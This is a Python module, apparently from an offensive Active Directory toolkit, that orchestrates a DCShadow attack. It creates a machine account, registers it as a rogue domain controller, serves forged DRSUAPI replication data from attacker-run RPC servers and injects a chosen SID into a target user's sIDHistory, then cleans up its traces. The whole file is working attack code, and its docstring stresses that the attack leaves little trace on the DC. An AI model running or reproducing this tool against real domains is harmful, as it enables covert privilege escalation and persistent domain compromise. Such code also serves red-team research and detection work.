"""
DCShadow SID History Injection (T1207 + T1134.005)

Main orchestrator for DCShadow-based sIDHistory injection via AD replication.

Injects sIDHistory by temporarily registering the attacker as a rogue Domain
Controller, then pushing crafted replication data.

No NTDS downtime. No disk artifacts on the DC. Works from Linux.

Flow:
1. Create machine account in AD (via SAMR)
2. Register DNS A record for rogue DC (via LDAP)
3. Compute Kerberos keys from machine password
4. Register rogue DC in AD (nTDSDSA + SPNs via LDAP/DRSUAPI)
5. Start EPM (port 135) and DRSUAPI (port 1337) RPC servers
6. Trigger replication via DRSReplicaAdd on the legitimate DC
7. Serve crafted DsGetNCChanges response with sIDHistory
8. Cleanup everything (nTDSDSA, SPNs, machine account, DNS)

Prerequisites:
- Domain Admin credentials
- Attacker IP reachable from the DC (ports 135 + 1337)
- Root on Linux (port 135 requires root)

References:
- https://github.com/ShutdownRepo/dcshadow (Python reference implementation)
- https://www.dcshadow.com/ (original research by Le Toux & Delpy)
- MS-DRSR: DRSGetNCChanges, DRSReplicaAdd, DRSAddEntry
"""

import logging
import os
from typing import Optional, Dict

try:
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

from ...sid_utils import SIDConverter
from .kerberos import KerberosUtils
from .rpc_server import DCShadowRPCServer, EPM_PORT, DRSUAPI_PORT
from .replication import ReplicationBuilder
from .rogue_dc import RogueDCManager, ReplicationTrigger


def _check_deps():
    """Raise if dependencies are missing."""
    try:
        from impacket.dcerpc.v5 import drsuapi
    except ImportError as e:
        raise ImportError(
            f"DCShadow requires impacket and pyasn1: {e}"
        )


class DCShadowAttack:
    """
    Main orchestrator for DCShadow-based sIDHistory injection.

    Usage:
        attack = DCShadowAttack(...)
        success = attack.execute()
    """

    def __init__(self, dc_ip: str, domain: str, base_dn: str,
                 target_user: str, sid_to_inject: str,
                 attacker_ip: str,
                 username: str, password: str,
                 lm_hash: str = '', nt_hash: str = '',
                 ldap_connection=None,
                 computer_name: Optional[str] = None,
                 computer_password: Optional[str] = None,
                 drsuapi_port: int = DRSUAPI_PORT):
        _check_deps()

        self.dc_ip = dc_ip
        self.domain = domain
        self.base_dn = base_dn
        self.target_user = target_user
        self.sid_to_inject = sid_to_inject
        self.attacker_ip = attacker_ip
        self.username = username
        self.password = password
        self.lm_hash = lm_hash
        self.nt_hash = nt_hash
        self.ldap_connection = ldap_connection
        self.computer_name = computer_name
        self.computer_password = computer_password
        self.drsuapi_port = drsuapi_port

        self._rogue_dc_manager = None
        self._rpc_server = None

    def execute(self) -> bool:
        """
        Execute the full DCShadow attack.

        Returns True if sIDHistory was successfully injected.
        """
        try:
            # Step 1: Setup rogue DC
            self._rogue_dc_manager = RogueDCManager(
                ldap_connection=self.ldap_connection,
                base_dn=self.base_dn,
                domain=self.domain,
                dc_ip=self.dc_ip,
                attacker_ip=self.attacker_ip,
                username=self.username,
                password=self.password,
                lm_hash=self.lm_hash,
                nt_hash=self.nt_hash,
                computer_name=self.computer_name,
                computer_password=self.computer_password,
            )

            if not self._rogue_dc_manager.setup():
                print("[-] DCShadow setup failed")
                return False

            # Step 2: Compute Kerberos keys
            print("[*] Computing Kerberos keys...")
            keys = KerberosUtils.compute_keys(
                self._rogue_dc_manager.computer_password,
                self.domain,
                self._rogue_dc_manager.computer_name,
            )
            logging.debug(f"RC4 key: {keys['rc4'].hex()}")

            # Step 3: Get target object info
            print("[*] Resolving target object...")
            target_info = self._get_target_info()
            if not target_info:
                print(f"[-] Target '{self.target_user}' not found")
                return False

            # Step 4: Get DC info
            dc_info = self._rogue_dc_manager._get_legit_dc_info()
            if not dc_info:
                print("[-] Could not get DC info")
                return False

            # Step 5: Build replication data
            print("[*] Building replication data...")
            sid_bytes = SIDConverter.string_to_bytes(self.sid_to_inject)
            if not sid_bytes:
                print(f"[-] Invalid SID: {self.sid_to_inject}")
                return False

            repl_data = ReplicationBuilder.build_getncchanges_response(
                target_dn=target_info['dn'],
                target_guid=target_info['guid'],
                target_sid=target_info['sid_bytes'],
                sid_to_inject=sid_bytes,
                rogue_dc_guid=self._rogue_dc_manager.ntdsdsa_guid or os.urandom(16),
                rogue_invocation_id=self._rogue_dc_manager.invocation_id or os.urandom(16),
                domain_dn=self.base_dn,
                highest_usn=dc_info.get('highest_usn', 1000),
            )

            # Step 6: Start RPC servers
            print(f"[*] Starting RPC servers ({self.attacker_ip}:{EPM_PORT}, :{self.drsuapi_port})...")
            self._rpc_server = DCShadowRPCServer(
                attacker_ip=self.attacker_ip,
                service_keys=keys,
                repl_data=repl_data,
                rogue_dc_guid=self._rogue_dc_manager.ntdsdsa_guid or os.urandom(16),
                rogue_invocation_id=self._rogue_dc_manager.invocation_id or os.urandom(16),
                drsuapi_port=self.drsuapi_port,
            )

            try:
                self._rpc_server.start()
            except PermissionError:
                print("[-] Port 135 requires root. Run with sudo.")
                return False
            except OSError as e:
                print(f"[-] Cannot start RPC server: {e}")
                return False

            # Step 7: Trigger replication
            print("[*] Triggering replication from rogue DC...")
            ReplicationTrigger.trigger(
                dc_ip=self.dc_ip,
                domain=self.domain,
                base_dn=self.base_dn,
                rogue_dc_guid=self._rogue_dc_manager.ntdsdsa_guid or os.urandom(16),
                rogue_dc_fqdn=self._rogue_dc_manager.computer_fqdn,
                username=self.username,
                password=self.password,
                lm_hash=self.lm_hash,
                nt_hash=self.nt_hash,
            )

            # Step 8: Wait for replication
            print("[*] Waiting for replication to complete...")
            if self._rpc_server.wait_for_replication(timeout=120):
                print("[+] DCShadow replication completed successfully")
                return True
            else:
                print("[-] Replication timed out (DC may not have connected)")
                return False

        except Exception as e:
            logging.error(f"DCShadow attack failed: {e}")
            import traceback
            traceback.print_exc()
            return False

        finally:
            # Always cleanup
            if self._rpc_server:
                self._rpc_server.stop()
            if self._rogue_dc_manager:
                self._rogue_dc_manager.cleanup()

    def _get_target_info(self) -> Optional[Dict]:
        """Get the target object's DN, GUID, and SID."""
        from ldap3 import SUBTREE
        from ldap3.utils.conv import escape_filter_chars

        try:
            safe_name = escape_filter_chars(self.target_user)
            self.ldap_connection.search(
                search_base=self.base_dn,
                search_filter=f"(sAMAccountName={safe_name})",
                search_scope=SUBTREE,
                attributes=['objectGUID', 'objectSid', 'distinguishedName']
            )

            if not self.ldap_connection.entries:
                return None

            entry = self.ldap_connection.entries[0]
            return {
                'dn': str(entry.distinguishedName),
                'guid': entry.objectGUID.raw_values[0],
                'sid_bytes': entry.objectSid.raw_values[0],
            }

        except Exception as e:
            logging.error(f"Target lookup failed: {e}")
            return None
